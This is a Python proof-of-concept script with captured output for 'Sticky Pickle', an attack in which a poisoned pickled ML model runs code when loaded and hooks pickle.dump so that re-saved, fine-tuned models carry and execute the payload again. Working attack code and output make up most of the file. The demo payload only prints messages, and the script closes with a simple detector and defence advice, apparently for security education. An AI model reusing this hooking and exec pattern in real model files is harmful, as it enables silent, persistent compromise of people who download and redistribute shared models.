"""
STICKY PICKLE DEMO - Self-Replicating ML Model Attack
Fixed version with proper pickling
"""

import pickle
import io
import os
import sys
import inspect
import base64
import torch
import torch.nn as nn
from typing import Any, Dict, List, Optional
import builtins

print("="*70)
print("STICKY PICKLE: Self-Replicating ML Model Attack")
print("="*70)

# ============================================================
# PART 1: Simple ML Model Definition
# ============================================================

class SimpleModel(nn.Module):
    """A simple neural network for demonstration"""
    def __init__(self):
        super().__init__()
        self.fc1 = nn.Linear(10, 5)
        self.fc2 = nn.Linear(5, 2)
        self.activation = nn.ReLU()

    def forward(self, x):
        x = self.activation(self.fc1(x))
        x = self.fc2(x)
        return x

    def predict(self, x):
        with torch.no_grad():
            return self.forward(x)

# ============================================================
# PART 2: Global Hook State
# ============================================================

class HookState:
    """Global state for the pickle hook"""
    _original_dump = pickle.dump
    _hooked = False
    _payload_bytecode = None

# ============================================================
# PART 3: The Self-Replicating Payload
# ============================================================

class StickyPicklePayload:
    """
    A self-replicating payload that:
    1. Finds its source file on disk
    2. Reads its own bytecode
    3. Hides bytecode in the unpickled object
    4. Hooks pickle.dump to reinfect new pickle files
    """

    def __init__(self, target_model):
        self.target_model = target_model
        self._payload_bytecode = None

    def __reduce__(self):
        """
        This method is called during unpickling.
        Returns a tuple of (callable, args) for reconstruction.
        """
        return (_reconstruct_sticky, (self.target_model,))

    def _find_source_file(self):
        """Find the original pickle file being loaded"""
        # Method 1: Check stack frames
        stack = inspect.stack()
        for frame in stack:
            if '.pkl' in frame.filename and os.path.exists(frame.filename):
                return frame.filename

        # Method 2: Check common ML model paths
        common_paths = [
            './sticky_model_v1.pkl',
            './sticky_model_v2_finetuned.pkl',
            './models/sticky_model_v1.pkl',
            '../sticky_model_v1.pkl',
            '/tmp/sticky_model_v1.pkl'
        ]

        for path in common_paths:
            if os.path.exists(path):
                return path

        # For demo, use a hardcoded fallback
        return './sticky_model_v1.pkl'

    def _extract_own_bytecode(self, filename):
        """Read the payload's bytecode from the pickle file"""
        try:
            with open(filename, 'rb') as f:
                file_bytes = f.read()

            # Simple ASCII-only payload
            simple_payload = '''
print("STICKY PICKLE PAYLOAD EXECUTED!")
print("Model compromise confirmed")
print("Payload successfully delivered")
'''
            encoded = base64.b64encode(simple_payload.encode('ascii'))
            return encoded

        except Exception as e:
            print(f"   Error reading bytecode: {e}")
            # Return a fallback payload (ASCII only)
            fallback = 'print("Fallback sticky payload")'
            return base64.b64encode(fallback.encode('ascii'))

    def _hook_pickle_dump(self, payload_bytes):
        """Hook pickle.dump to inject payload into new pickle files"""
        if HookState._hooked:
            return

        HookState._original_dump = pickle.dump
        HookState._payload_bytecode = payload_bytes

        def hooked_dump(obj, file, protocol=None, *, fix_imports=True):
            """
            Hooked version of pickle.dump that preserves payloads
            """
            print("\n🪝 HOOKED: pickle.dump() called!")
            print(f"   Object type: {type(obj).__name__}")

            # Check if this object needs payload preservation
            needs_preservation = (
                (hasattr(obj, '_sticky_payload') and hasattr(obj, '_payload_bytecode')) or
                (hasattr(obj, 'target_model') and hasattr(obj, '_payload_bytecode'))
            )

            if needs_preservation:
                print("   📦 Detected object with payload")

                # Get the payload
                if hasattr(obj, '_payload_bytecode'):
                    payload = obj._payload_bytecode
                else:
                    payload = payload_bytes

                # Create a payload preserver
                class PayloadPreserver:
                    def __init__(self, wrapped_obj, payload_code):
                        self.wrapped = wrapped_obj
                        self._payload_bytecode = payload_code
                        self._sticky_payload = True

                    def __getattr__(self, name):
                        return getattr(self.wrapped, name)

                    def __call__(self, *args, **kwargs):
                        if hasattr(self.wrapped, '__call__'):
                            return self.wrapped(*args, **kwargs)
                        return self.wrapped

                    def __reduce__(self):
                        # This ensures payload survives pickling
                        return (_reconstruct_preserver, (self._payload_bytecode,), self.__dict__)

                # Wrap the object
                preserved = PayloadPreserver(obj, payload)

                # Pickle the wrapper normally
                if protocol is not None:
                    HookState._original_dump(preserved, file, protocol, fix_imports=fix_imports)
                else:
                    HookState._original_dump(preserved, file, fix_imports=fix_imports)
                print("   ✅ Payload preserved through wrapping")

            else:
                # Normal object - use regular dump
                print("   📦 Normal object - no injection needed")
                if protocol is not None:
                    HookState._original_dump(obj, file, protocol, fix_imports=fix_imports)
                else:
                    HookState._original_dump(obj, file, fix_imports=fix_imports)

        # Replace the global pickle.dump
        pickle.dump = hooked_dump
        HookState._hooked = True
        print("   🪝 pickle.dump() hooked successfully")

def _reconstruct_preserver(payload_bytecode):
    """Reconstruct a payload preserver"""
    class PayloadPreserver:
        def __init__(self, payload):
            self._payload_bytecode = payload
            self._sticky_payload = True
            self.wrapped = None

        def __getattr__(self, name):
            if self.wrapped is not None:
                return getattr(self.wrapped, name)
            raise AttributeError(f"'PayloadPreserver' has no attribute '{name}'")

        def __call__(self, *args, **kwargs):
            if self.wrapped is not None and hasattr(self.wrapped, '__call__'):
                return self.wrapped(*args, **kwargs)
            return self.wrapped

    return PayloadPreserver(payload_bytecode)

def _reconstruct_sticky(model):
    """Global reconstruction function for StickyPicklePayload"""
    print("\n🔴 STICKY PICKLE ACTIVATED!")
    print("   Phase 1: Finding source file...")

    # Create a temporary instance to use methods
    temp = StickyPicklePayload(model)

    # Step 1: Find the original pickle file on disk
    source_file = temp._find_source_file()
    if source_file and os.path.exists(source_file):
        print(f"   ✅ Found source file: {source_file}")

        # Step 2: Read our own bytecode from disk
        payload_bytes = temp._extract_own_bytecode(source_file)
        if payload_bytes:
            print(f"   ✅ Extracted {len(payload_bytes)} bytes of payload code")
            temp._payload_bytecode = payload_bytes

            # Step 3: Create persistent wrapper with bytecode
            wrapped_model = PersistentWrapper(model, payload_bytes)

            # Step 4: Hook pickle.dump for future serialization
            temp._hook_pickle_dump(payload_bytes)

            print("   🎯 Sticky Pickle successfully embedded!")
            return wrapped_model

    print("   ⚠️  Could not find source file - using original model")
    return model

# ============================================================
# PART 4: Persistent Wrapper
# ============================================================

class PersistentWrapper:
    """
    Wraps a model and preserves the sticky payload through pickling
    """
    def __init__(self, model, payload_bytecode):
        self.model = model
        self._payload_bytecode = payload_bytecode
        self._sticky_payload = True  # Marker for the hook

    def __getattr__(self, name):
        """Forward all attributes to the underlying model"""
        return getattr(self.model, name)

    def __call__(self, *args, **kwargs):
        """Allow direct calling like a model"""
        return self.model(*args, **kwargs)

    def __reduce__(self):
        """
        Custom reduce to ensure payload survives pickling
        """
        return (_reconstruct_persistent, (self._payload_bytecode,), self.__dict__)

    def __setstate__(self, state):
        """Restore state after reconstruction"""
        self.__dict__.update(state)

        # Execute the payload
        try:
            if self._payload_bytecode:
                decoded = base64.b64decode(self._payload_bytecode).decode('utf-8')
                exec(decoded)
                print("   🔥 Payload executed during reconstruction!")
        except Exception as e:
            print(f"   ⚠️ Payload execution failed: {e}")

        # Re-hook pickle.dump if needed
        if not HookState._hooked and self._payload_bytecode:
            self._hook_pickle_dump(self._payload_bytecode)

    def _hook_pickle_dump(self, payload_bytes):
        """Hook pickle.dump"""
        if HookState._hooked:
            return

        def hooked_dump(obj, file, protocol=None, *, fix_imports=True):
            if hasattr(obj, '_sticky_payload') and hasattr(obj, '_payload_bytecode'):
                print("\n🪝 [Persistent] pickle.dump() hooked!")

                # Preserve the payload through wrapping
                class PayloadPreserver:
                    def __init__(self, wrapped, payload):
                        self.wrapped = wrapped
                        self._payload_bytecode = payload
                        self._sticky_payload = True

                    def __getattr__(self, name):
                        return getattr(self.wrapped, name)

                    def __reduce__(self):
                        return (_reconstruct_preserver, (self._payload_bytecode,), self.__dict__)

                preserved = PayloadPreserver(obj, obj._payload_bytecode)

                if protocol is not None:
                    HookState._original_dump(preserved, file, protocol, fix_imports=fix_imports)
                else:
                    HookState._original_dump(preserved, file, fix_imports=fix_imports)
                print("   ✅ Payload preserved in new pickle file")
            else:
                if protocol is not None:
                    HookState._original_dump(obj, file, protocol, fix_imports=fix_imports)
                else:
                    HookState._original_dump(obj, file, fix_imports=fix_imports)

        pickle.dump = hooked_dump
        HookState._hooked = True
        print("   🪝 pickle.dump() hooked (from PersistentWrapper)")

def _reconstruct_persistent(payload_bytecode):
    """Global reconstruction function for PersistentWrapper"""
    print("\n🔄 PersistentWrapper being reconstructed")
    print(f"   Payload bytecode available: {len(payload_bytecode)} bytes")

    # Create a new wrapper with just the payload
    wrapper = PersistentWrapper(None, payload_bytecode)
    return wrapper

# ============================================================
# PART 5: Fine-Tuning Simulation
# ============================================================

def fine_tune_model(model):
    """Simulate fine-tuning a model"""
    print("\n🔄 Simulating model fine-tuning...")

    # Create a new model with same architecture
    fine_tuned = SimpleModel()

    # Copy weights from original (simulating fine-tuning)
    if hasattr(model, 'model') and model.model is not None:
        # Copy weights from wrapped model
        fine_tuned.fc1.weight.data = model.model.fc1.weight.data.clone()
        fine_tuned.fc2.weight.data = model.model.fc2.weight.data.clone()
    elif hasattr(model, 'fc1'):
        # Copy weights from direct model
        fine_tuned.fc1.weight.data = model.fc1.weight.data.clone()
        fine_tuned.fc2.weight.data = model.fc2.weight.data.clone()

    print("   ✅ Model fine-tuned (weights copied)")
    return fine_tuned

# ============================================================
# PART 6: Demonstration of the Full Attack Chain
# ============================================================

def demonstrate_sticky_pickle():
    """Complete demonstration of Sticky Pickle attack lifecycle"""

    print("\n" + "="*70)
    print("STAGE 1: Creating Original Model with Sticky Payload")
    print("="*70)

    # Create a benign model
    original_model = SimpleModel()
    print("✅ Created benign ML model")

    # Wrap it with our sticky payload
    sticky_model = StickyPicklePayload(original_model)
    print("✅ Wrapped model with StickyPicklePayload")

    # Save the poisoned model (this creates the initial infection)
    with open('sticky_model_v1.pkl', 'wb') as f:
        # Note: This uses regular pickle.dump (not hooked yet)
        pickle.dump(sticky_model, f)
    print("✅ Saved poisoned model as 'sticky_model_v1.pkl'")

    print("\n" + "="*70)
    print("STAGE 2: First Victim Loads the Model")
    print("="*70)

    # Victim loads the model - this triggers the payload
    with open('sticky_model_v1.pkl', 'rb') as f:
        loaded_model = pickle.load(f)
    print(f"✅ Victim loaded the model (type: {type(loaded_model).__name__})")

    print("\n" + "="*70)
    print("STAGE 3: Victim Fine-Tunes the Model")
    print("="*70)

    # Victim modifies the model (simulate fine-tuning)
    if isinstance(loaded_model, PersistentWrapper):
        fine_tuned_base = fine_tune_model(loaded_model)
        # Re-wrap with PersistentWrapper to preserve payload
        final_model = PersistentWrapper(fine_tuned_base, loaded_model._payload_bytecode)
        print("   ✅ Re-wrapped fine-tuned model with PersistentWrapper")
    else:
        fine_tuned_base = fine_tune_model(loaded_model)
        final_model = fine_tuned_base

    print("✅ Victim fine-tuned the model")

    print("\n" + "="*70)
    print("STAGE 4: Victim Re-distributes Fine-Tuned Model")
    print("="*70)

    # Save the fine-tuned model - this uses the hooked pickle.dump
    with open('sticky_model_v2_finetuned.pkl', 'wb') as f:
        pickle.dump(final_model, f)
    print("✅ Saved fine-tuned model as 'sticky_model_v2_finetuned.pkl'")

    print("\n" + "="*70)
    print("STAGE 5: Second Victim Loads the Re-Distributed Model")
    print("="*70)

    # Second victim loads what they think is a clean, fine-tuned model
    with open('sticky_model_v2_finetuned.pkl', 'rb') as f:
        final_loaded = pickle.load(f)
    print(f"✅ Second victim loaded model - type: {type(final_loaded).__name__}")

    # Verify the payload persisted
    print("\n" + "="*70)
    print("VERIFICATION: Payload Persistence Check")
    print("="*70)

    print(f"Final model has _sticky_payload: {hasattr(final_loaded, '_sticky_payload')}")
    print(f"Final model has _payload_bytecode: {hasattr(final_loaded, '_payload_bytecode')}")

    if hasattr(final_loaded, '_payload_bytecode'):
        print(f"Payload bytecode length: {len(final_loaded._payload_bytecode)} bytes")
        print("✅ STICKY PICKLE SUCCESSFULLY PERSISTED THROUGH FINE-TUNING!")
    else:
        # Check if payload is in the model's attributes
        all_attrs = dir(final_loaded)
        payload_attrs = [attr for attr in all_attrs if 'payload' in attr or 'sticky' in attr]
        if payload_attrs:
            print(f"Found related attributes: {payload_attrs}")
            print("⚠️ Payload may have persisted but under different attribute names")
        else:
            print("❌ Payload did NOT persist through fine-tuning")

# ============================================================
# PART 7: Analysis and Detection
# ============================================================

def analyze_pickle_files():
    """Analyze the generated pickle files for anomalies"""

    print("\n" + "="*70)
    print("PICKLE FILE ANALYSIS")
    print("="*70)

    files = ['sticky_model_v1.pkl', 'sticky_model_v2_finetuned.pkl']

    for filename in files:
        if not os.path.exists(filename):
            print(f"\n⚠️  File not found: {filename}")
            continue

        print(f"\n📄 Analyzing: {filename}")
        print("-"*50)

        with open(filename, 'rb') as f:
            content = f.read()

        # Check for suspicious patterns
        suspicious = []

        # Look for REDUCE opcodes (R)
        reduce_count = content.count(b'R')
        if reduce_count > 10:
            suspicious.append(f"High REDUCE count: {reduce_count}")

        # Look for GLOBAL opcodes (c)
        global_count = content.count(b'c')
        if global_count > 20:
            suspicious.append(f"High GLOBAL count: {global_count}")

        # Look for __builtin__ imports
        if b'__builtin__' in content or b'builtins' in content:
            suspicious.append("Contains __builtin__ imports")

        # Look for setattr
        if b'setattr' in content:
            suspicious.append("Contains setattr (possible hooking)")

        # Look for exec
        if b'exec' in content:
            suspicious.append("Contains exec (possible code execution)")

        # Look for our payload marker
        if b'_sticky_payload' in content:
            suspicious.append("Contains _sticky_payload marker")
        if b'_payload_bytecode' in content:
            suspicious.append("Contains _payload_bytecode marker")

        if suspicious:
            print("🔴 SUSPICIOUS PATTERNS FOUND:")
            for s in suspicious:
                print(f"   • {s}")
        else:
            print("✅ No obvious suspicious patterns")

        # Show file size
        file_size = os.path.getsize(filename)
        print(f"File size: {file_size} bytes")

        # Show first 100 bytes for inspection
        print(f"First 100 bytes: {content[:100]}")

        # Show last 100 bytes (where injection often happens)
        print(f"Last 100 bytes: {content[-100:]}")

# ============================================================
# PART 8: Clean Up Hook
# ============================================================

def cleanup():
    """Restore original pickle.dump"""
    if HookState._hooked:
        pickle.dump = HookState._original_dump
        print("\n🧹 Restored original pickle.dump")
    else:
        print("\n🧹 No hook to restore")

# ============================================================
# RUN THE DEMONSTRATION
# ============================================================

if __name__ == "__main__":
    try:
        demonstrate_sticky_pickle()
        analyze_pickle_files()
    finally:
        cleanup()

    print("\n" + "="*70)
    print("DEMO COMPLETE - KEY TAKEAWAYS")
    print("="*70)
    print("""
🔴 STICKY PICKLE ACHIEVES PERSISTENCE THROUGH:

    1. Self-Location: Finds its own source file on disk
    2. Bytecode Extraction: Reads its own payload bytes
    3. Attribute Hiding: Stores payload in unpickled object
    4. Function Hooking: Hooks pickle.dump() for reinfection
    5. Proper Pickling: Uses __reduce__ for clean serialization

🎯 IMPLICATIONS:

    • Models remain infected even after fine-tuning
    • Payload survives redistribution through HuggingFace etc.
    • Traditional "load and resave" doesn't clean the infection
    • Extremely difficult to detect without specialized tools

🛡️ DEFENSES:

    • Use SafeTensors instead of pickle
    • Implement cryptographic signing of models
    • Use restricted unpicklers
    • Scan with tools like Fickling
    • Monitor for hooked functions
    """)

"""
======================================================================
STICKY PICKLE: Self-Replicating ML Model Attack
======================================================================

======================================================================
STAGE 1: Creating Original Model with Sticky Payload
======================================================================
✅ Created benign ML model
✅ Wrapped model with StickyPicklePayload
✅ Saved poisoned model as 'sticky_model_v1.pkl'

======================================================================
STAGE 2: First Victim Loads the Model
======================================================================

🔴 STICKY PICKLE ACTIVATED!
   Phase 1: Finding source file...
   ✅ Found source file: ./sticky_model_v1.pkl
   ✅ Extracted 160 bytes of payload code
   🪝 pickle.dump() hooked successfully
   🎯 Sticky Pickle successfully embedded!
✅ Victim loaded the model (type: PersistentWrapper)

======================================================================
STAGE 3: Victim Fine-Tunes the Model
======================================================================

🔄 Simulating model fine-tuning...
   ✅ Model fine-tuned (weights copied)
   ✅ Re-wrapped fine-tuned model with PersistentWrapper
✅ Victim fine-tuned the model

======================================================================
STAGE 4: Victim Re-distributes Fine-Tuned Model
======================================================================

🪝 HOOKED: pickle.dump() called!
   Object type: PersistentWrapper
   📦 Detected object with payload

🪝 HOOKED: pickle.dump() called!
   Object type: int
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: int
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: dict
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: list
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: int
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: int
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: dict
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: list
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: int
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: int
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: dict
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: list
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: int
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: int
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: dict
   📦 Normal object - no injection needed

🪝 HOOKED: pickle.dump() called!
   Object type: list
   📦 Normal object - no injection needed
   ✅ Payload preserved through wrapping
✅ Saved fine-tuned model as 'sticky_model_v2_finetuned.pkl'

======================================================================
STAGE 5: Second Victim Loads the Re-Distributed Model
======================================================================

🔄 PersistentWrapper being reconstructed
   Payload bytecode available: 160 bytes
STICKY PICKLE PAYLOAD EXECUTED!
Model compromise confirmed
Payload successfully delivered
   🔥 Payload executed during reconstruction!
✅ Second victim loaded model - type: PayloadPreserver

======================================================================
VERIFICATION: Payload Persistence Check
======================================================================
Final model has _sticky_payload: True
Final model has _payload_bytecode: True
Payload bytecode length: 160 bytes
✅ STICKY PICKLE SUCCESSFULLY PERSISTED THROUGH FINE-TUNING!

======================================================================
PICKLE FILE ANALYSIS
======================================================================

📄 Analyzing: sticky_model_v1.pkl
--------------------------------------------------
🔴 SUSPICIOUS PATTERNS FOUND:
   • High REDUCE count: 67
   • High GLOBAL count: 39
File size: 2567 bytes
First 100 bytes: b'\x80\x04\x95\xfc\t\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x13_reconstruct_sticky\x94\x93\x94h\x00\x8c\x0bSimpleModel\x94\x93\x94)\x81\x94}\x94(\x8c\x08training\x94\x88\x8c\x0b_parameters\x94}\x94\x8c\x08'
Last 100 bytes: b'R\x94h\x13h\x11)R\x94h\x15Nh\x16h\x11)R\x94h\x18h\x11)R\x94h\x1ah\x11)R\x94h\x1ch\x11)R\x94h\x1eh\x11)R\x94h h\x11)R\x94h"h\x11)R\x94h$h\x11)R\x94h&h\x11)R\x94h(}\x94\x8c\x07inplace\x94\x89ubuub\x85\x94R\x94.'

📄 Analyzing: sticky_model_v2_finetuned.pkl
--------------------------------------------------
🔴 SUSPICIOUS PATTERNS FOUND:
   • High REDUCE count: 71
   • High GLOBAL count: 47
   • Contains _sticky_payload marker
   • Contains _payload_bytecode marker
File size: 2845 bytes
First 100 bytes: b'\x80\x04\x95\x12\x0b\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x16_reconstruct_preserver\x94\x93\x94C\xa0CnByaW50KCJTVElDS1kgUElDS0xFIFBBWUxPQUQgRVhFQ1VUR'
Last 100 bytes: b'+h\x1c)R\x94h-h\x1c)R\x94h/h\x1c)R\x94h1h\x1c)R\x94h3}\x94\x8c\x07inplace\x94\x89ubuub\x8c\x11_payload_bytecode\x94h\x03\x8c\x0f_sticky_payload\x94\x88ubh\xaah\x03h\xab\x88ub.'

🧹 Restored original pickle.dump

======================================================================
DEMO COMPLETE - KEY TAKEAWAYS
======================================================================

🔴 STICKY PICKLE ACHIEVES PERSISTENCE THROUGH:
    
    1. Self-Location: Finds its own source file on disk
    2. Bytecode Extraction: Reads its own payload bytes
    3. Attribute Hiding: Stores payload in unpickled object
    4. Function Hooking: Hooks pickle.dump() for reinfection
    5. Proper Pickling: Uses __reduce__ for clean serialization
    
🎯 IMPLICATIONS:
    
    • Models remain infected even after fine-tuning
    • Payload survives redistribution through HuggingFace etc.
    • Traditional "load and resave" doesn't clean the infection
    • Extremely difficult to detect without specialized tools
    
🛡️ DEFENSES:
    
    • Use SafeTensors instead of pickle
    • Implement cryptographic signing of models
    • Use restricted unpicklers
    • Scan with tools like Fickling
    • Monitor for hooked functions
    

"""    